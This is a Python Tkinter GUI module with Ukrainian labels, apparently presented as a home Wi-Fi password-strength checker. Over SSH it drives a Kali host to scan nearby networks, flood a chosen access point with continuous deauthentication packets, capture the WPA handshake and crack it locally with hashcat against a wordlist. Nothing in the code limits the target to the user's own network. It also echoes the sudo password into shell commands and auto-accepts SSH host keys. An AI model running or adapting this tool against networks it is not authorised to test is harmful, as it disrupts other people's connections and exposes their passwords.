import ttkbootstrap as ttk
import tkinter as tk
import paramiko
import time
import os
import subprocess
import re
from datetime import datetime
from widget_registry import widget_registry
from network_utils import get_networks_correct_form, get_selected_network, mask_value
from ssh_utils import remove_and_create_wifi2, remove_and_create_handshake, execute_command_with_sudo, is_process_running, copy_file_via_sftp
from log_utils import log_message
from config import config
from network_utils import get_local_path

local_path = get_local_path()

username = config.get("username")
password = config.get("password")
local_handshake_path = os.path.join(local_path, config.get("handshake_folder"))
local_dict_path = os.path.join(local_path, config.get("dict_folder"))
local_hashcat_path = os.path.join(local_path, config.get("hashcat_folder"))

file_name = None


def init(notebook, root):
    tab = ttk.Frame(notebook, padding=20)

    fixed_font = tk.font.nametofont("TkFixedFont")

    # Start scan
    scan_button = ttk.Button(
        tab,
        text="Сканувати доступні Wi-Fi мережі",
        command=lambda: on_wifi_scan(root),
        bootstyle=ttk.SUCCESS
    )
    scan_button.pack(pady=10)
    widget_registry.register_widget("hs_scan_button", scan_button)

    # Scan status Label
    scan_status_label = ttk.Label(tab, text="")
    scan_status_label.pack(pady=10)
    widget_registry.register_widget("hs_scan_status_label", scan_status_label)

    ttk.Frame(tab).pack(pady=10)

    # Listbox Label
    networks_label = ttk.Label(tab, anchor="w", text=f"{'BSSID':<20} {'Ch':<5} {'Протокол':<15} {'Шифрування':<15} {'ESSID':<30}")
    networks_label.pack(pady=0, anchor="w", fill="x")
    widget_registry.register_widget("hs_networks_label", networks_label)

    # Listbox to display found Wi-Fi networks
    networks_listbox = tk.Listbox(tab, height=8, font=fixed_font)
    networks_listbox.pack(fill="x", pady=10)
    networks_listbox.bind("<<ListboxSelect>>", on_network_select)
    widget_registry.register_widget("hs_networks_listbox", networks_listbox)

    # Check for vulnerabilities
    check_button = ttk.Button(
        tab,
        text="Перехоплення Handshake",
        command=lambda: on_handshake_check(root),
        bootstyle=ttk.SUCCESS,
        state=ttk.DISABLED
    )
    check_button.pack(pady=10)
    widget_registry.register_widget("hs_check_button", check_button)

    # Check status Label
    check_status_label = ttk.Label(tab, text="")
    check_status_label.pack(pady=10)
    widget_registry.register_widget("hs_check_status_label", check_status_label)

    # Handshake combo row
    handshake_frame = ttk.Frame(tab)
    handshake_frame.pack(fill="x", pady=5)

    handshake_combo_label = ttk.Label(handshake_frame, text="Оберіть хендшейк для розшифрування:")
    handshake_combo_label.pack(side="left", padx=5)
    widget_registry.register_widget("hs_handshake_combo_label", handshake_combo_label)

    handshake_combo_box = ttk.Combobox(handshake_frame, values=[], width=30)
    handshake_combo_box.pack(side="left", padx=5)
    widget_registry.register_widget("hs_handshake_combo_box", handshake_combo_box)

    # Dict combo row
    dict_frame = ttk.Frame(tab)
    dict_frame.pack(fill="x", pady=5)

    dict_combo_label = ttk.Label(dict_frame, text="Оберіть словник:")
    dict_combo_label.pack(side="left", padx=5)
    widget_registry.register_widget("hs_dict_combo_label", dict_combo_label)

    dict_combo_box = ttk.Combobox(dict_frame, values=[], width=30)
    dict_combo_box.pack(side="left", padx=5)
    widget_registry.register_widget("hs_dict_combo_box", dict_combo_box)

    # Decode Button
    decode_button = ttk.Button(dict_frame, text="Розшифрувати", bootstyle=ttk.SUCCESS, state=ttk.NORMAL, command=lambda: on_decode(root))
    decode_button.pack(side="left", padx=10)
    widget_registry.register_widget("hs_decode_button", decode_button)

    populate_combos(root)

    return tab


def list_files(folder):
    return [f for f in os.listdir(folder) if os.path.isfile(os.path.join(folder, f))]


def populate_combos(root):
    dictionaries = list_files(local_dict_path)
    handshake_files = list_files(local_handshake_path)
    widget_registry.get_widget("hs_dict_combo_box")['values'] = dictionaries
    widget_registry.get_widget("hs_handshake_combo_box")['values'] = handshake_files


def on_network_select(event):
    selected_network = get_selected_network(widget_registry.get_widget("hs_networks_listbox"))
    if selected_network:
        check_status_label_text = "Обрано мережу: " + selected_network.split()[0]
        widget_registry.get_widget("hs_check_status_label").config(text=check_status_label_text)
        widget_registry.get_widget("hs_check_button").config(state=ttk.NORMAL)


def on_wifi_scan(root):
    global file_name

    host = config.get("host")

    widget_registry.get_widget("hs_scan_button").config(state=ttk.DISABLED)
    widget_registry.get_widget("hs_scan_status_label").config(text="Починаємо роботу...")
    log_message("[Handshake]: Починаємо роботу...")

    widget_registry.get_widget("hs_check_button").config(state=ttk.DISABLED)
    widget_registry.get_widget("hs_check_status_label").config(text="")

    networks = []
    widget_registry.get_widget("hs_networks_listbox").delete(0, 'end')

    root.update()

    # Запитуємо у користувача назву файлу
    file_name = datetime.now().strftime("%Y-%m-%d-%H-%M-%S")
    file_path = f"/home/kali/wifi2/{file_name}"

    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        ssh.connect(host, username=username, password=password)

        remove_and_create_wifi2(ssh, password)
        remove_and_create_handshake(ssh, password)

        widget_registry.get_widget("hs_scan_status_label").config(text="Переводимо wlan0 в режим моніторингу...")
        log_message("[Handshake]: Переводимо wlan0 в режим моніторингу...")
        root.update()

        print("Переводимо wlan0 в режим моніторингу...")

        # Зупиняємо конфліктуючі процеси
        ssh.exec_command(f'echo {password} | sudo -S airmon-ng check kill', get_pty=True)
        time.sleep(2)

        # Запускаємо моніторинг
        ssh.exec_command(f'echo {password} | sudo -S airmon-ng start wlan0', get_pty=True)
        time.sleep(5)

        widget_registry.get_widget("hs_scan_status_label").config(text="Запускаємо airodump-ng для сканування мереж...")
        log_message("[Handshake]: Запускаємо airodump-ng для сканування мереж...")
        root.update()

        print("Запускаємо airodump-ng для сканування мереж...")

        # Запускаємо airodump-ng у фоновому режимі через screen
        ssh.exec_command(f'echo {password} | sudo -S screen -dm airodump-ng -w {file_path} wlan0mon', get_pty=True)
        time.sleep(10)

        # Додаткова затримка для запису даних
        time.sleep(15)

        # Читаємо файл назвафайлу-01.csv
        csv_file_path = f"{file_path}-01.csv"
        print(f"Читаємо файл {csv_file_path}...")

        widget_registry.get_widget("hs_scan_status_label").config(text="Читаємо файл...")
        log_message(f"[Handshake]: Читаємо файл {csv_file_path}...")
        root.update()

        stdin, stdout, stderr = ssh.exec_command(f'cat {csv_file_path}', get_pty=True)
        time.sleep(2)

        # Зчитуємо вміст файлу
        csv_output = stdout.read().decode()
        csv_errors = stderr.read().decode()

        if csv_output:
            print(f"Зчитаний вміст файлу:\n{csv_output}\n")  # Друк зчитаного вмісту для діагностики

            # Обробка тексту вручну
            lines = csv_output.strip().splitlines()
            headers = [header.strip() for header in lines[0].split(',')]  # Видаляємо пробіли з заголовків
            print("Заголовки CSV-файлу:", headers)  # Діагностика заголовків

            # Визначаємо індекси необхідних колонок
            try:
                index_bssid = headers.index("BSSID")
                index_protocol = headers.index("Privacy")
                index_encryption = headers.index("Cipher")
                index_ch = headers.index("channel")
                index_essid = headers.index("ESSID")

                print(f"{'BSSID':<20} {'Ch':<5} {'Протокол':<15} {'Шифрування':<15} {'ESSID':<30}")
                print("=" * 85)

                # Виведення даних для кожного рядка
                for row in lines[1:]:
                    columns = [col.strip() for col in row.split(',')]

                    # Перевіряємо, чи є достатня кількість колонок
                    if len(columns) > max(index_bssid, index_protocol, index_encryption, index_ch, index_essid) and len(columns[index_essid]) > 0:
                        bssid = columns[index_bssid]
                        protocol = columns[index_protocol]
                        encryption = columns[index_encryption]
                        ch = columns[index_ch]
                        essid = columns[index_essid]
                        print(f"{bssid:<20} {ch:<5} {protocol:<15} {encryption:<15} {essid:<30}")

                        network = f"{bssid:<20} {ch:<5} {protocol:<15} {encryption:<15} {essid:<30}"
                        networks.append(network)
                        widget_registry.get_widget("hs_networks_listbox").insert(tk.END, f"{network}")
                        widget_registry.get_widget("hs_scan_status_label").config(text=f"{get_networks_correct_form(len(networks))}")
                        root.update()
                    else:
                        print("Пропускаємо рядок, який не містить усіх необхідних даних:", columns)

                    # Preselect the first item
                    widget_registry.get_widget("hs_networks_listbox").select_set(0)
                    widget_registry.get_widget("hs_networks_listbox").activate(0)
                    on_network_select(None)

                    widget_registry.get_widget("hs_scan_button").config(state=ttk.NORMAL)

            except ValueError as ve:
                print(f"Помилка: {ve}. Перевірте заголовки CSV-файлу.")

        if csv_errors:
            print(f"Помилка при читанні файлу: {csv_errors}")

    except Exception as e:
        print(f"Виникла помилка: {e}")

    finally:
        print("\nЗупинка моніторингового режиму...")
        stdin, stdout, stderr = ssh.exec_command(f'echo {password} | sudo -S airmon-ng stop wlan0mon', get_pty=True)
        stdout.channel.recv_exit_status()  # Очікування завершення команди
        output_stop = stdout.read().decode()
        errors_stop = stderr.read().decode()
        print(f"Результат зупинки моніторингового режиму:\n{output_stop}")
        if errors_stop:
            print(f"Помилка: {errors_stop}")

        ssh.close()
        print("Підключення до SSH закрито.")


def on_handshake_check(root):
    global file_name

    host = config.get("host")

    widget_registry.get_widget("hs_check_button").config(state=ttk.DISABLED)
    root.update()

    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        ssh.connect(host, username=username, password=password)

        selected_network = get_selected_network(widget_registry.get_widget("hs_networks_listbox"))
        bssid = selected_network.split()[0]
        channel = selected_network.split()[1]
        remote_cap_file = f"/home/kali/handshake/{file_name}-01.cap"
        remote_hccapx_folder = "/home/kali/convert"
        remote_hccapx_file = f"{remote_hccapx_folder}/{file_name}.hccapx"

        print(bssid, channel, remote_cap_file, remote_hccapx_folder, remote_hccapx_file)

        print("Переконуємося, що папки для збереження файлів існують...")
        log_message("[Handshake]: Переконуємося, що папки для збереження файлів існують...")
        execute_command_with_sudo(ssh, "mkdir -p /home/kali/handshake /home/kali/convert", password)

        print("Перевіряємо, чи wlan0mon активний...")
        widget_registry.get_widget("hs_check_status_label").config(
            text="Перевіряємо, чи wlan0mon активний..."
        )
        log_message("[Handshake]: Перевіряємо, чи wlan0mon активний...")
        root.update()

        stdin, stdout, stderr = ssh.exec_command("iwconfig wlan0mon")
        if "Mode:Monitor" not in stdout.read().decode():
            print("Переводимо wlan0 в режим моніторингу...")
            widget_registry.get_widget("hs_check_status_label").config(
                text="Переводимо wlan0 в режим моніторингу..."
            )
            log_message("[Handshake]: Переводимо wlan0 в режим моніторингу...")
            root.update()
            execute_command_with_sudo(ssh, "airmon-ng start wlan0", password)
            time.sleep(5)

        print("Запускаємо airodump-ng для збору хендшейку...")
        widget_registry.get_widget("hs_check_status_label").config(
            text="Запускаємо airodump-ng для збору хендшейку..."
        )
        log_message("[Handshake]: Запускаємо airodump-ng для збору хендшейку...")
        root.update()

        # Запускаємо airodump-ng у фоновому режимі
        airodump_command = (
            f"sudo airodump-ng -w /home/kali/handshake/{file_name} "
            f"-c {channel} --bssid {bssid} wlan0mon > /dev/null 2>&1 &"
        )
        ssh.exec_command(airodump_command)
        time.sleep(5)

        print("Запускаємо атаку деавтентифікації одночасно...")
        widget_registry.get_widget("hs_check_status_label").config(
            text="Запускаємо атаку деавтентифікації одночасно..."
        )
        log_message("[Handshake]: Запускаємо атаку деавтентифікації одночасно...")
        root.update()

        # Запускаємо aireplay-ng у фоновому режимі
        aireplay_command = f"sudo aireplay-ng --deauth 0 -a {bssid} wlan0mon > /dev/null 2>&1 &"
        ssh.exec_command(aireplay_command)

        print("Очікуємо 70 секунд для збору хендшейку...")
        widget_registry.get_widget("hs_check_status_label").config(text="Очікуємо 70 секунд для збору хендшейку...")
        log_message("[Handshake]: Очікуємо 70 секунд для збору хендшейку...")
        root.update()

        time.sleep(70)

        print("Зупиняємо процеси airodump-ng та aireplay-ng...")
        widget_registry.get_widget("hs_check_status_label").config(
            text="Зупиняємо процеси airodump-ng та aireplay-ng..."
        )
        log_message("[Handshake]: Зупиняємо процеси airodump-ng та aireplay-ng...")
        root.update()

        execute_command_with_sudo(ssh, "killall -q airodump-ng", password)
        execute_command_with_sudo(ssh, "killall -q aireplay-ng", password)

        print("Конвертуємо CAP у HCCAPX за допомогою hcxpcapngtool...")
        widget_registry.get_widget("hs_check_status_label").config(text="Конвертуємо CAP у HCCAPX за допомогою hcxpcapngtool...")
        log_message("[Handshake]: Конвертуємо CAP у HCCAPX за допомогою hcxpcapngtool...")
        root.update()

        stdout, stderr = execute_command_with_sudo(
            ssh, f"hcxpcapngtool -o {remote_hccapx_file} {remote_cap_file}", password
        )
        if stderr:
            print(f"Помилка hcxpcapngtool: {stderr}")
            widget_registry.get_widget("hs_check_status_label").config(text=f"Помилка hcxpcapngtool: {stderr}")
            log_message(f"[Handshake]: Помилка hcxpcapngtool: {stderr}")
            root.update()
        else:
            print("Конвертація успішна.")
            widget_registry.get_widget("hs_check_status_label").config(text="Конвертація успішна.")
            log_message("[Handshake]: Конвертація успішна.")
            root.update()

        print("Перевіряємо, чи HCCAPX-файл створено...")
        widget_registry.get_widget("hs_check_status_label").config(text="Перевіряємо, чи HCCAPX-файл створено...")
        log_message("[Handshake]: Перевіряємо, чи HCCAPX-файл створено...")
        root.update()

        stdin, stdout, stderr = ssh.exec_command(f"ls {remote_hccapx_file}")
        if stdout.read().strip():
            print(f"HCCAPX-файл знайдено: {remote_hccapx_file}")
            log_message(f"[Handshake]: HCCAPX-файл знайдено: {remote_hccapx_file}")
            print("Копіюємо файл на локальний комп'ютер...")
            log_message("[Handshake]: Копіюємо файл на локальний комп'ютер...")
            widget_registry.get_widget("hs_check_status_label").config(text=f"HCCAPX-файл знайдено: {remote_hccapx_file}\nКопіюємо файл на локальний комп'ютер...")
            root.update()

            copy_file_via_sftp(remote_hccapx_file, local_handshake_path, host, username, password)

            populate_combos(root)
        else:
            print("Файл HCCAPX не створено. Перевірте логіку збору хендшейків.")
            widget_registry.get_widget("hs_check_status_label").config(text="Файл HCCAPX не створено. Перевірте логіку збору хендшейків.")
            log_message("[Handshake]: Файл HCCAPX не створено. Перевірте логіку збору хендшейків.")
            root.update()

        print("Зупиняємо інтерфейс wlan0mon...")
        widget_registry.get_widget("hs_check_status_label").config(text="Зупиняємо інтерфейс wlan0mon...")
        root.update()

        execute_command_with_sudo(ssh, "airmon-ng stop wlan0mon", password)

    except Exception as e:
        print(f"Виникла помилка: {e}")

    finally:
        print("\nЗупинка моніторингового режиму...")
        stdin, stdout, stderr = ssh.exec_command(f'echo {password} | sudo -S airmon-ng stop wlan0mon', get_pty=True)
        stdout.channel.recv_exit_status()  # Очікування завершення команди
        output_stop = stdout.read().decode()
        errors_stop = stderr.read().decode()
        print(f"Результат зупинки моніторингового режиму:\n{output_stop}")
        if errors_stop:
            print(f"Помилка: {errors_stop}")

        ssh.close()
        print("Підключення до SSH закрито.")

        widget_registry.get_widget("hs_check_status_label").config(text="")
        widget_registry.get_widget("hs_check_button").config(state=ttk.NORMAL)
        root.update()



def on_decode(root):
    selected_handshake = widget_registry.get_widget("hs_handshake_combo_box").get()
    selected_dict = widget_registry.get_widget("hs_dict_combo_box").get()
    print(selected_handshake, selected_dict)

    # Команда для запуску Hashcat
    command = f"hashcat -m 22000 -a 0 \"{os.path.join(local_handshake_path, selected_handshake)}\" \"{os.path.join(local_dict_path, selected_dict)}\""
    print(f"\nЗапуск команди:\n{command}")

    print("Починаємо розшифрування...")
    widget_registry.get_widget("hs_check_status_label").config(text="Починаємо розшифрування...")
    log_message("[Handshake]: Починаємо розшифрування...")
    root.update()

    try:
        # Запуск Hashcat
        process = subprocess.run(command, shell=True, capture_output=True, text=True)
        output = process.stdout
        print(output.strip())

        # Патерн для пошуку успішного розшифрування
        pattern_success = r"Status\.{11}: Cracked"
        pattern_fail = r"Status\.{11}: Exhausted"
        pattern_password = r"^Candidates\.#1.*?->\s*(\S+)$"

        match_success = re.search(pattern_success, output)
        if match_success:
            message_success = "Ваша мережа використовує слабкий пароль.\nРадимо вам змінити пароль та змінити протокол шифрування на новішу версію, за можливістю."
            log_message(f"[Handshake]: {message_success}")

            match_password = re.search(pattern_password, output, re.MULTILINE)
            if match_password:
                passw = match_password.group(1)
                message_success += f"\n\nВаш пароль: {mask_value(passw)}"

            print(message_success)
            widget_registry.get_widget("hs_check_status_label").config(text=message_success)
            root.update()
        else:
            match_fail = re.search(pattern_fail, output)
            if match_fail:
                message_fail = "Чудово! У вас надійний пароль."
                print(message_fail)
                widget_registry.get_widget("hs_check_status_label").config(text=message_fail)
                log_message(f"[Handshake]: {message_fail}")
                root.update()
            else:
                widget_registry.get_widget("hs_check_status_label").config(text=f"Помилка розшифрування")
                log_message(f"[Handshake]: Помилка розшифрування")
                root.update()

    except Exception as e:
        print(f"Виникла помилка: {e}")
        widget_registry.get_widget("hs_check_status_label").config(text=f"Виникла помилка: {e}")
        log_message(f"[Handshake]: Виникла помилка: {e}")
        root.update()
